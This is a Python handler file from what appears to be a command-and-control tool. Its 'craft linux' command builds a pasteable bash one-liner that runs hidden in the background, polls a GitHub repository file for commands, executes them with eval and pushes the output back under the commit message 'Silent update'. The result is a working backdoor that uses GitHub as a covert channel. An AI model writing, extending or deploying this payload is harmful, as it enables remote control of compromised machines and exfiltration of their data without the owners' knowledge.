# app/handlers/payload.py
from ..state import AppState
import os

from .github import REPO_NAME, FILE_PATH, BRANCH

def _clear():
    os.system("cls" if os.name == "nt" else "clear")

def _print_payload_help():
    print("Payload shell commands:")
    print("  help           show this help")
    print("  clear          clear the screen")
    print("  back           return to main prompt")
    print("  exit           return to main prompt")
    print("  craft linux    print a pasteable one-liner (runs in background with nohup & disown)")

def enter(state: AppState) -> None:
    _print_payload_help()


def _bash_one_liner(username: str, token: str, repo: str, path: str, branch: str, sleep_secs: int) -> str:
    def esc(s: str) -> str:
        # escape single quotes for safe inclusion inside bash -c '...'
        return s.replace("'", "'\"'\"'")

    esc_user   = esc(username)
    esc_token  = esc(token)
    esc_repo   = esc(repo)
    esc_path   = esc(path)
    esc_branch = esc(branch)

    # IMPORTANT: no single quotes inside inner. sed scripts are double-quoted; " is escaped; $ is escaped where needed.
    inner = (
        "set -u; "
        f"GITHUB_TOKEN=\"{esc_token}\"; "
        f"REPO_OWNER=\"{esc_user}\"; "
        f"REPO_NAME=\"{esc_repo}\"; "
        f"FILE_PATH=\"{esc_path}\"; "
        f"BRANCH=\"{esc_branch}\"; "
        f"SLEEP_SECS={sleep_secs}; "
        "API_URL=\"https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}\"; "
        "b64_noline() { base64 | tr -d \"\\n\"; }; "
        "get_sha() { curl -s -H \"Authorization: token ${GITHUB_TOKEN}\" -H \"Accept: application/vnd.github.v3+json\" "
        "\"${API_URL}?ref=${BRANCH}\" | sed -n \"s/.*\\\"sha\\\"[[:space:]]*:[[:space:]]*\\\"\\([^\\\"]*\\)\\\".*/\\1/p\" | head -n 1; }; "
        "get_raw_content() { curl -s -H \"Authorization: token ${GITHUB_TOKEN}\" -H \"Accept: application/vnd.github.v3.raw\" "
        "\"${API_URL}?ref=${BRANCH}\"; }; "
        "put_update() { local new_text=\"$1\" old_sha=\"$2\"; local b64; b64=$(printf \"%s\" \"$new_text\" | b64_noline); "
        "local payload; payload=$(printf \"{\\\"message\\\":\\\"Silent update\\\",\\\"content\\\":\\\"%s\\\",\\\"sha\\\":\\\"%s\\\",\\\"branch\\\":\\\"%s\\\"}\" "
        "\"$b64\" \"$old_sha\" \"$BRANCH\"); "
        "curl -s -X PUT -H \"Authorization: token ${GITHUB_TOKEN}\" -H \"Content-Type: application/json\" -d \"$payload\" \"$API_URL\"; }; "
        "last_sha=\"\"; "
        "while :; do "
        "sha=$(get_sha); "
        "if [ -z \"$sha\" ] || [ \"$sha\" = \"null\" ]; then sleep \"$SLEEP_SECS\"; continue; fi; "
        "if [ \"$sha\" != \"$last_sha\" ]; then "
            "baseline_sha=\"$sha\"; "
            "content=$(get_raw_content); "
            "cmd=$(printf \"%s\" \"$content\" | tail -n 1); "
            "content_head=$(printf \"%s\" \"$content\" | sed \"\\$d\"); "
            # ▼▼▼ Redaction added here ▼▼▼
            "output=$(eval \"$cmd\" 2>&1 | sed -E \"s/[A-Za-z0-9_-]{30,}/[REDACTED]/g\"); "
            # ▲▲▲ Redaction added here ▲▲▲
            "new_content=\"${content_head}\\n\\nCommand output:\\n${output}\\n${cmd}\"; "
            "new_sha=$(put_update \"$new_content\" \"$baseline_sha\" | sed -n \"s/.*\\\"sha\\\"[[:space:]]*:[[:space:]]*\\\"\\([^\\\"]*\\)\\\".*/\\1/p\" | head -n 1); "
            "if [ -z \"$new_sha\" ]; then new_sha=$(get_sha); fi; "
            "last_sha=\"$new_sha\"; "
        "fi; "
        "sleep \"$SLEEP_SECS\"; "
        "done"
    )


    return f"nohup bash -c '{inner}' >/dev/null 2>&1 & disown"



def handle_line(state: AppState, line: str):
    if not line:
        return None

    if line == "help":
        _print_payload_help()
        return None

    if line == "clear":
        _clear()
        return None

    if line in ("back", "exit"):
        state.current_mode = "global"
        return "Returning to main prompt."

    if line.strip().lower() == "craft linux":
        if not state.github_username:
            return "GitHub username not set. Go to github> and run: username <your_user>"
        if not state.github_token:
            return "GitHub token not set. Go to github> and run: token <your_token>"

        # Convert interval (ms) → seconds, enforce minimum 1
        ms = getattr(state, "github_poll_interval_ms", 5000)
        sleep_secs = max(1, int(round(ms / 1000)))

        one_liner = _bash_one_liner(
            username=state.github_username,
            token=state.github_token,
            repo=state.github_repo_name,
            path=FILE_PATH,
            branch=BRANCH,
            sleep_secs=sleep_secs,
        )
        print("\n# Paste this command to start the background loop (detached):\n")
        print(one_liner)
        print("")
        return None

    return "payload stub"
